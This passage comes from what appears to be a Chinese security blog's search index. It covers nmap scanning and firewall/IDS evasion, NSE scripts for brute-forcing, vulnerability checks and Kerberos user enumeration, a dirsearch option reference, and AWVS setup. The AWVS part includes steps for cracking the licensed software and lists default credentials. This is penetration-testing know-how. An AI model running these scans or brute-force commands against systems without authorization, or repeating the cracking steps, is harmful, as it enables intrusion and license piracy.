ICMP timestamp request</li></ol><p>依次发送四个报文探测目标机是否开启。只要收到其中一个包的回复，那就证明目标机开启。使用四种不同类型的数据包可以避免因防火墙或丢包造成的判断错误</p><p><strong>nmap -PE/-PP/-PM</strong></p><p><strong>-PE</strong> 的ICMP Echo扫描简单来说是通过向目标发送ICMP Echo数据包来探测目标主机是否存活，但由于许多主机的防火墙会禁止这些报文，所以仅仅ICMP扫描通常是不够的。  </p><p><strong>-PP</strong> 的ICMP time stamp时间戳扫描在大多数<strong>防火墙配置不当</strong>时可能会得到回复，可以以此方式来判断目标主机是否存活。倘若目标主机在线，该命令还会探测其开放的端口以及运行的服务！                    </p><p><strong>-PM</strong> 的ICMP address maskPing地址掩码扫描会试图用备选的ICMP等级Ping指定主机，通常有不错的<strong>穿透防火墙</strong>的效果</p><h3 id="探测内网IP时"><a href="#探测内网IP时" class="headerlink" title="探测内网IP时"></a>探测内网IP时</h3><p><strong>nmap -sn</strong></p><p>使用<code>nmap -sn [内网ip]</code>这个命令会发送<strong>arp请求包</strong>探测目标ip是否在线，如果有arp回复包，则说明在线。此命令可以探测目标主机是否在线，如果在线，还可以得到其MAC地址。但是不会探测其开放的端口号。</p><p><strong>nmap -PE/-PP/-PM</strong></p><p>使用 <code>nmap -PE/PP/PM [内网ip]</code> 探测主机的开启情况，使用的是ARP请求报文，如果有ARP回复报文，说明主机在线。-PP/PE/PM命令探测到主机在线后，还会探测主机的端口的开启状态以及运行的服务</p><h3 id="tcp"><a href="#tcp" class="headerlink" title="tcp"></a>tcp</h3><p><strong>TCP SYN 扫描(-sS)</strong></p><p>​    这是Nmap默认的扫描方式，通常被称作半开放扫描。该方式发送SYN到目标端口，如果收到SYN/ACK回复，那么可以判断端口是开放的；如果收到RST包，说明该端口是关闭的。如果没有收到回复，那么可以判断该端口被屏蔽了。因为该方式仅发送SYN包对目标主机的特定端口，但不建立完整的TCP连接，所以相对比较隐蔽，而且效率比较高，适用范围广。</p><p><strong>TCP connent 扫描(-sT)</strong></p><p>   TCP connect方式使用系统网络API connect向目标主机的端口发起连接，如果无法连接，说明该端口关闭。该方式扫描速度慢，而且由于建立完整的TCP连接会在目标主机上留下记录，不够隐蔽。所以，TCP connect是TCP SYN无法使用才考虑使用的方式</p><p><strong>TCP ACK 扫描(-sA)</strong></p><p>   向目标主机的端口发送ACK包，如果收到RST包，说明该端口没有被防火墙屏蔽；没有收到RST包，说明被屏蔽。该方式只能用于确定防火墙是否屏蔽某个端口，可以辅助TCP SYN的方式来判断目标主机防火墙的状况</p><p><strong>TCP FIN/Xmas/NULL 扫描(-sN/sF/sX)</strong></p><p>   这三种扫描方式被称为秘密扫描，因为相对比较隐蔽。FIN扫描向目标主机的端口发送的TCP FIN包或Xmas tree包或NULL包，如果收到对方的RST回复包，那么说明该端口是关闭的；没有收到RST包说明该端口可能是开放的或者被屏蔽了。其中Xmas tree包是指flags中FIN URG PUSH被置为1的TCP包；NULL包是指所有的flags都为0的TCP包。</p><p><strong>UDP扫描(-sU)</strong></p><p>   UDP扫描用于判断UDP端口的情况，向目标主机的UDP端口发送探测包，如果收到回复ICMP port unreachable就说明该端口是关闭的；如果没有收到回复，那说明该UDP端口可能是开放的或者屏蔽的。因此，通过反向排除法的方式来判断哪些UDP端口是可能处于开放状态的。</p><p><strong>其他方式(-sY/-sZ)</strong></p><p>   除了以上几种常用的方式外，Nmap还支持多种其他的探测方式。例如使用SCTP INIT/Cookie-ECHO方式是来探测SCTP的端口开放情况；使用IP protocol方式来探测目标主机支持的协议类型(tcp/udp/icmp/sctp等等)；使用idle scan方式借助僵尸主机来扫描目标主机，以达到隐蔽自己的目的；或者使用FTP bounce scan，借助FTP允许的代理服务扫描其他的主机，同样达到隐蔽自己的目的</p><p><strong>nmap -A ip</strong></p><p>这个命令不仅列出目标主机开放的端口号，对应的服务，还较为详细的列出了服务的版本，其支持的命令,到达目标主机的每一跳路由等信息。在进行完全扫描时，扫描机与目标主机之间存在大量的数据流量交互，扫描时长随之增加。完全扫描不仅仅是TCP协议上的通信交互，还有例如ICMP、HTTP、NBSS、TDS、POP等等协议的交互，这些协议的交互是因为在完全扫描开始时首先对目标主机的开放端口进行了确认，之后再根据不同对应的不同服务进行服务版本信息探测、账户信息等信息的探测！</p><h2 id="防火墙-IDS规避"><a href="#防火墙-IDS规避" class="headerlink" title="防火墙/IDS规避"></a>防火墙/IDS规避</h2><p>防火墙与IDS规避为用于绕开防火墙与IDS的检测与屏蔽，以便能够更加详细地发现目标主机的状况。nmap提供了多种规避技巧通常可以从两个方面考虑规避方式：<strong>数据包的变换</strong>(Packet Change)和<strong>时序变换</strong>(Timing Change)</p><p><strong>分片</strong></p><p>将可疑的探测包进行分片处理(例如将TCP包拆分成多个IP包发送过去)，某些简单的防火墙为了加快处理速度可能不会进行重组检查，以此避开其检查</p><p><strong>IP诱骗(IP decoys)</strong></p><p>在进行扫描时，将真实IP地址在和其他主机的IP地址混合使用(其他主机需要在线，否则目标主机将回复大量数据包到不存在的数主机，从而实质构成了DOS攻击)，以此让目标主机的防火墙或IDS追踪大量的不同IP地址的数据包，降低其追查到自身的概率。但是，某些高级的IDS系统通过统计分析仍然可以追踪出扫描者真实的IP地址</p><p><strong>IP伪装</strong></p><p>IP伪装就是将自己发送的数据包中的IP地址伪装成其他主机的地址，从而目标机认为是其他主机与之通信。需要注意的是，如果希望接收到目标主机的回复包，那么伪装的IP需要位于统一局域网内。另外，如果既希望隐蔽自己的IP地址，又希望收到目标主机的回复包，那么可以尝试使用idle scan 或匿名代理等网络技术</p><p><strong>指定源端口</strong></p><p>某些目标主机只允许来自特定端口的数据包通过防火墙。例如，FTP服务器的配置为允许源端口为21号的TCP包通过防火墙与FTP服务器通信，但是源端口为其他的数据包被屏蔽。所以，在此类情况下，可以指定数据包的源端口</p><p><strong>扫描延时</strong></p><p>某些防火墙针对发送过于频繁的数据包会进行严格的侦查，而且某些系统限制错误报文产生的频率。所以，我们可以降低发包的频率和发包延时以此降低目标主机的审查强度</p><p><strong>其他技术</strong></p><p>nmap还提供其他多种规避技巧，比如指定使用某个网络接口来发送数据包、指定发送包的最小长度、指定发包的MTU、指定TTL、指定伪装的MAC地址，使用错误检查。</p><h2 id="NSE脚本引擎"><a href="#NSE脚本引擎" class="headerlink" title="NSE脚本引擎"></a>NSE脚本引擎</h2><p>NSE脚本引擎(Nmap Scripting Engine)是nmap最强大，最灵活的功能之一，允许用户自己编写脚本来执行自动化的操作或者扩展nmap的功能。</p><p>nmap的脚本库的路径：<code>/usr/share/nmap/scripts</code> 或 <code>/xx/nmap/scripts/ </code>，该目录下的文件都是nse脚本</p><p>NSE使用Lua脚本语言，并且默认提供了丰富的脚本库，目前已经包含了14个类别的350多个脚本。NSE的设计初衷主要考虑以下几个方面：</p><ul><li>网络发现（Network Discovery）</li><li>更加复杂的版本侦测（例如 skype 软件）</li><li>漏洞侦测(Vulnerability Detection)</li><li>后门侦测(Backdoor Detection)</li><li>漏洞利用(Vulnerability Exploitation)</li></ul><p><strong>Nmap的脚本主要分为以下几类：</strong></p><ul><li><p>Auth：负责处理鉴权证书(绕过鉴权)的脚本</p></li><li><p>Broadcast：在局域网内探查更多服务去开启情况，如DHCP/DNS等</p></li><li><p>Brute：针对常见的应用提供暴力破解方式，如HTTP/HTTPS</p></li><li><p>Default：使用-sC或-A选项扫描时默认的脚本，提供基本的脚本扫描能力</p></li><li><p>Discovery：对网络进行更多的信息搜集，如SMB枚举，SNMP查询等</p></li><li><p>Dos：用于进行拒绝服务攻击</p></li><li><p>Exploit：利用已知的漏洞入侵系统</p></li><li><p>External：利用第三方的数据库或资源 。如，进行whois解析</p></li><li><p>Fuzzer：模糊测试脚本，发送异常的包到目标机，探测出潜在漏洞</p></li><li><p>Intrusive：入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽</p></li><li><p>Malware：探测目标是否感染了病毒，开启后门等</p></li><li><p>Safe：与Intrusive相反，属于安全性脚本</p></li><li><p>Version：负责增强服务与版本扫描功能的脚本</p></li><li><p>Vuln：负责检查目标机是否有常见漏洞，如MS08-067</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">例如：</span><br><span class="line">nmap -script   smb-vuln-ms17-010  192.168.10.34     #可以探测该主机是否存在ms17_010漏洞</span><br><span class="line">nmap --max-parallelism 800 --script http-slowloris scanme.nmap.org  #可以探测该主机是否存在http拒绝服务攻击漏洞</span><br><span class="line">nmap -script http-iis-short-name-brute 192.168.10.34  #探测是否存在IIS短文件名漏洞</span><br><span class="line">nmap -script mysql-empty-password 192.168.10.34       #验证mysql匿名访问</span><br><span class="line">nmap -p 443 -script ssl-ccs-injection 192.168.10.34   #验证是否存在openssl CCS注入漏洞</span><br><span class="line">namp --script=auth 192.168.10.34 #鉴权扫描 扫弱口令</span><br><span class="line"> </span><br><span class="line">--script=http-waf-detect            #验证主机是否存在WAF</span><br><span class="line">--script=http-waf-fingerprint       #验证主机是否存在WAF</span><br><span class="line"> </span><br><span class="line">nmap --script-brute 192.168.1.1     #nmap可对数据库、SMB、SNMP等进行简单密码的暴力破解</span><br><span class="line">nmap --script-vuln  192.168.1.1     #扫描是否有常见漏洞</span><br><span class="line"> </span><br><span class="line">--script-updatedb         #更新脚本数据库</span><br><span class="line">--script-help             #输入脚本对应的使用方法</span><br><span class="line"></span><br><span class="line">namp -n -p 445 --script=broadcast 192.168.10.34#探测内网更多服务</span><br><span class="line">namp -script external baidu.com</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 当主机不在域环境，可通过以下命令爆破域内用户</span></span></span><br><span class="line">nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realx=&quot;xie.com&quot;,userdb=&quot;users.txt&quot; 192.168.10.131</span><br></pre></td></tr></table></figure><h2 id="vulscan-git"><a href="#vulscan-git" class="headerlink" title="vulscan.git"></a>vulscan.git</h2><p><a href="https://github.com/scipag/vulscan">https://github.com/scipag/vulscan</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/share/nmap/script</span><br><span class="line">sudo git clone https://github.com/scipag/vulscan</span><br><span class="line"><span class="meta">#</span><span class="bash">使用</span></span><br><span class="line">sudo nmap --script vulscan --script-args vulscandb=scipvuldb.csv -sV 192.168.201.131 |more</span><br></pre></td></tr></table></figure><h2 id="nmap-xml-csv"><a href="#nmap-xml-csv" class="headerlink" title="nmap-xml-csv"></a>nmap-xml-csv</h2><p>帮实习生写个脚本吧，功能是xml格式转换成表格方便客户查看</p><h3 id="安装libnmap模块"><a href="#安装libnmap模块" class="headerlink" title="安装libnmap模块"></a>安装libnmap模块</h3><p><a href="https://pypi.org/project/python-libnmap/">https://pypi.org/project/python-libnmap/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install python-libnmap</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1619665649282-e7c89330-5fc3-4ecd-95e6-c9bda66bb364.png" alt="img"></p><p>window下这样报错家常便饭，先换官方手册上的git安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/savon-noir/python-libnmap.git</span><br><span class="line">cd python-libnmap</span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure><p>导入xml格式文件</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1619666416703-ae2873aa-2510-4f30-925b-19f5ab14c74c.png" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> libnmap.parser <span class="keyword">import</span> NmapParser</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line"><span class="comment">## xml --&gt; csv</span></span><br><span class="line">xml_filename = <span class="built_in">input</span>(<span class="string">&quot;输入要导入的xml文件路径：&quot;</span>)</span><br><span class="line">csv_filename = <span class="built_in">input</span>(<span class="string">&quot;导出文件名称或路径(chestnut:IDC_SYN.csv)：&quot;</span>)</span><br><span class="line"></span><br><span class="line">rep_obj = NmapParser.parse_fromfile(xml_filename)</span><br><span class="line">csv_obj = csv.writer(<span class="built_in">open</span>(csv_filename, <span class="string">&#x27;w&#x27;</span>, newline=<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">csv_obj.writerow([<span class="string">&#x27;主机&#x27;</span>, <span class="string">&#x27;端口&#x27;</span>, <span class="string">&#x27;协议&#x27;</span>, <span class="string">&#x27;服务&#x27;</span>, <span class="string">&#x27;状态&#x27;</span>, <span class="string">&#x27;信息&#x27;</span>])</span><br><span class="line"><span class="keyword">for</span> _host <span class="keyword">in</span> rep_obj.hosts:</span><br><span class="line">    <span class="keyword">for</span> serv <span class="keyword">in</span> _host.services:</span><br><span class="line">        data = [_host.ipv4, serv.port, serv.protocol, serv.service, serv.state, serv.banner]</span><br><span class="line">        csv_obj.writerow(data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;xml转换成csv格式完成&#x27;</span>)</span><br></pre></td></tr></table></figure><p>环境是python3，打包下方便实习生使用</p><h3 id="使用，拖入就好"><a href="#使用，拖入就好" class="headerlink" title="使用，拖入就好"></a>使用，拖入就好</h3><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1619687845621-aff36654-a3de-4bb5-b629-2b2cd6d74e05.png" alt="img"></p><h3 id="封装方法-命令行参数"><a href="#封装方法-命令行参数" class="headerlink" title="封装方法+命令行参数"></a>封装方法+命令行参数</h3><p><a href="https://www.runoob.com/python3/python3-command-line-arguments.html">https://www.runoob.com/python3/python3-command-line-arguments.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dirsearch</title>
      <link href="/p/56e7c490.html"/>
      <url>/p/56e7c490.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch.py [-u|--url] target [-e|--extensions] extensions [options] Options:</span><br></pre></td></tr></table></figure><h2 id="Mandatory-强制参数"><a href="#Mandatory-强制参数" class="headerlink" title="Mandatory(强制参数):"></a>Mandatory(强制参数):</h2><p><code>-l FILE</code>, <code>--url-list=FILE</code>  #扫描列表文件中所有的url</p><p><code>--stdin</code>           URL list from STDIN    –cidr=CIDR     Target CIDR</p><p><code>--raw=FILE</code>     File contains the raw request (use –scheme flag to set the scheme)</p><p><code>-e EXTENSIONS</code> <code>--extensions=EXTENSIONS</code>                          设置网站脚本类型，<code>php,asp,*</code></p><p><code>-X EXTENSIONS</code> <code>--exclude-extensions=EXTENSIONS</code>     排除以逗号分隔的扩展名列表 (Example: asp,jsp)</p><p><code>-f</code> <code>--force-extensions</code>     扩展字典里的每个词条</p><h2 id="Dictionary-Settings-字典设置"><a href="#Dictionary-Settings-字典设置" class="headerlink" title="Dictionary Settings(字典设置):"></a>Dictionary Settings(字典设置):</h2><p><code>-w WORDLIST</code> <code>--wordlists=WORDLIST</code>              <strong>设置字典（逗号分隔）</strong></p><p><code>--prefixes=PREFIXES</code>                             向所有条目添加自定义前缀（以逗号分隔）</p><p><code>--suffixes=SUFFIXES</code>                             向所有条目添加自定义后缀（以逗号分隔）</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1619059870602-150f6a26-7741-4ea2-a878-9e71c89c1eff.png" alt="img"></p><p><code>--remove-extensions</code>     #删除所有单词列表条目中的扩展名（例如：admin.php-&gt; admin）</p><p><code>-U</code> <code>--uppercase</code>          #Uppercase wordlist 大写</p><p><code>-L</code> <code>--lowercase</code>           # Lowercase wordlist 小写</p><p><code>-C</code> <code>--capital</code>               #Capital wordlist 首字母大写</p><h2 id="General-Settings-通用设置"><a href="#General-Settings-通用设置" class="headerlink" title="General Settings(通用设置):"></a>General Settings(通用设置):</h2><p><code>-r</code>  <code>--recursive   #Bruteforce recursively</code>    <strong># 递归扫描，跑出目录后，继续跑目录下面的目录</strong></p><p><code>-R DEPTH</code> <code>--recursion-depth=DEPTH</code>        <strong># 设置最大递归深度</strong></p><p><code>-t THREADS</code> <code>--threads=THREADS</code>               <strong># 设置线程数量</strong>  </p><p><code>--subdirs=SUBDIRS</code>                         # 扫描指定URL的子目录（用逗号分隔）</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1619061483770-3314f9f3-3cdf-42aa-a926-a58cc0ef54eb.png" alt="img"></p><p><code>--exclude-subdirs=SUBDIRS</code>                         # 在递归扫描中，<strong>排除指定的子目录</strong> </p><p><code>-i STATUS</code> <code>--include-status=STATUS</code>         # 包含的状态码 (Example: 200,300-399)</p><p><code>-x STATUS</code> <code>--exclude-status=STATUS</code>     <strong># 排除的状态码 (Example: 301,500-599)</strong></p><p><code>--exclude-sizes=SIZES</code>                     # 排除异常响应 (Example: 123B,4KB)</p><p><code>--exclude-texts=TEXTS</code>                     # 排除文字响应(Example: ‘Not found’, ‘Error’)</p><p><code>--exclude-regexps=REGEXPS</code>          # 使用正则匹配排除的文字响应(Example: ‘Not foun[a-z]{1}’, ‘^Error$’)</p><p><code>--exclude-redirects=REGEXPS</code>     # 通过重定向正则表达式或文本排除响应，逗号隔开(Example: ‘<a href="https://okta.com/*&#39;">https://okta.com/*&#39;</a>)</p><p><code>--random-agent</code>           <strong># 为每个请求选择一个随机的User-Agent</strong></p><p><code>--skip-on-429</code>             # 返回429状态码时跳过目标</p><p><code>--full-url</code>                     # 返回完整url</p><h2 id="Request-Settings-请求设置"><a href="#Request-Settings-请求设置" class="headerlink" title="Request Settings(请求设置):"></a>Request Settings(请求设置):</h2><p><code>-m METHOD, --http-method=METHOD</code>     # HTTP请求方式(default: GET)</p><p><code>-d DATA, --data=DATA</code>                    # HTTP请求数据</p><p><code>-H HEADERS, --header=HEADERS</code># HTTP请求标头，支持多个标志 (Example: -H ‘Referer: example.com’ -H ‘Accept: <em>/</em>‘)</p><p><code>--header-list=FILE</code>                      # 文件包含HTTP请求标头</p><p><code>-F</code> <code>--follow-redirects</code>                     <strong># 跟随地址重定向扫描</strong></p><p><code>--user-agent=USERAGENT</code>                <strong>#设置用户代理</strong></p><p><code>--cookie=COOKIE</code>                        <strong>#设置cookie</strong></p><h2 id="Connection-Settings-连接设置"><a href="#Connection-Settings-连接设置" class="headerlink" title="Connection Settings(连接设置):"></a>Connection Settings(连接设置):</h2><p><code>--timeout=TIMEOUT</code>          # 设置超时时间</p><p><code>--ip=IP</code>                   # 设置代理IP</p><p><code>-s DELAY, --delay=DELAY</code>    <strong># 设置请求之间的延迟</strong></p><p><code>--proxy=PROXY</code>            # 代理URL，支持HTTP和SOCKS代理 (Example: localhost:8080, socks5://localhost:8088)</p><p><code>--proxy-list=FILE</code>              # File contains proxy servers</p><p><code>--replay-proxy=PROXY</code>         # Proxy to replay with found paths</p><p><code>--scheme=SCHEME</code>           # Default scheme (for raw request or if there is no scheme in the URL)</p><p><code>--max-retries=RETRIES</code>        # 设置最大重试次数</p><p><code>-b, --request-by-hostname</code>      # By default dirsearch requests by IP for speed. This will force requests by hostname</p><p><code>--exit-on-error</code>               # Exit whenever an error occurs</p><p><code>--debug</code>                   # Debug mode</p><h2 id="Reports-报告输出"><a href="#Reports-报告输出" class="headerlink" title="Reports(报告输出):"></a>Reports(报告输出):</h2><p><code>--simple-report=OUTPUTFILE</code></p><p><code>--plain-text-report=OUTPUTFILE</code></p><p><code>--json-report=OUTPUTFILE</code></p><p><code>--xml-report=OUTPUTFILE</code></p><p><code>--markdown-report=OUTPUTFILE</code></p><p><code>--csv-report=OUTPUTFILE</code></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1619074696275-802dd0f3-5be5-4c03-abf2-27c845ac8b97.png" alt="img">             </p><p>可以通过修改<code>default.conf</code>文件修改默认配置，更多信息访问此链接</p><p>You can change the dirsearch default configurations (default extensions,timeout, wordlist location, …) by editing the “default.conf” file. More</p><p>information at <a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a>.</p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AWVS扫描器</title>
      <link href="/p/34660774.html"/>
      <url>/p/34660774.html</url>
      
        <content type="html"><![CDATA[<p>有的客户特别中意AWVS的扫描报告，简单记录下使用过程。</p><span id="more"></span><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><p><a href="https://www.jianguoyun.com/p/DWAi1gcQl-u_CBjbhLgD">https://www.jianguoyun.com/p/DWAi1gcQl-u_CBjbhLgD</a> (访问密码 : 4k21vo)</p><p>将<code>.zip</code>删除</p><p>下一步下一步安装即可。破解过程：</p><ol><li><code>wvsc.exe</code> 覆盖<code>C:\Program Files (x86)\Acunetix\13.0.200205121</code>目录下同名文件</li><li><code>license_info.json</code> 覆盖<code>C:\ProgramData\Acunetix\shared\license</code>目录下同名文件</li></ol><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p><a href="https://hub.docker.com/r/secfa/docker-awvs">https://hub.docker.com/r/secfa/docker-awvs</a></p><h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#  pull 拉取下载镜像</span><br><span class="line">docker pull secfa/docker-awvs</span><br><span class="line"></span><br><span class="line">#  将容器的3443端口映射到宿主机的 13443端口</span><br><span class="line">docker run -it -d -p 13443:3443 secfa/docker-awvs</span><br><span class="line"></span><br><span class="line"># 开放端口</span><br><span class="line">iptables -A INPUT -p tcp --dport 13443 -j ACCEPT</span><br></pre></td></tr></table></figure><p>链接地址<a href="https://127.0.0.1:13443/">https://127.0.0.1:13443/</a></p><h1 id="用户密码"><a href="#用户密码" class="headerlink" title="用户密码"></a>用户密码</h1><p><a href="https://hub.docker.com/r/secfa/docker-awvs">https://hub.docker.com/r/secfa/docker-awvs</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">admin123@email.com</span><br><span class="line">Admin123</span><br><span class="line"># 最新拉取密码改为</span><br><span class="line">username: admin@admin.com  </span><br><span class="line">password: Admin123</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1619578517298-4d1bd4bc-45b2-460c-933a-8649c4ab106a.png" alt="img"></p><h2 id="功能表"><a href="#功能表" class="headerlink" title="功能表"></a>功能表</h2><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1600932667082-59ec876e-84dd-4a88-a688-849ed3ca3396.png" alt="img"></h2><ul><li><p><strong>Dashboard</strong>是仪表盘，你扫描过的网站的一些漏洞信息这里会显示</p></li><li><p><strong>Targets</strong>是目标网站，就是你要扫描的目标网站</p></li><li><p><strong>Vulnerabilities</strong>就是漏洞，网站的漏洞</p></li><li><p><strong>Scans</strong>就是扫描目标站点，从Target里面选择目标站点进行扫描</p></li><li><p><strong>Reports</strong>就是漏洞扫描完之后的报告</p></li></ul><h2 id="建立扫描"><a href="#建立扫描" class="headerlink" title="建立扫描"></a>建立扫描</h2><p>点击Targets–&gt;Add Target</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210819201434815.png" alt="image-20210819201434815"></p><p>然后进入了下面这个页面，<strong>Scan Speed</strong>可以选择扫描的速度，速度越慢扫描的也越仔细。如果站点是需要登录的网站，这里就要勾选上<strong>Site Login</strong>，如果站点不需要登录的话，这里就不用勾选。这底下还有一个<strong>AcuSensor</strong>，总的来说就是允许扫描仪从PHP、ASP或JSP应用程序中收集更多信息，从而改进扫描结果并使其可靠性更高。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.sqlsec.com/2020/04/awvs.html">https://www.sqlsec.com/2020/04/awvs.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
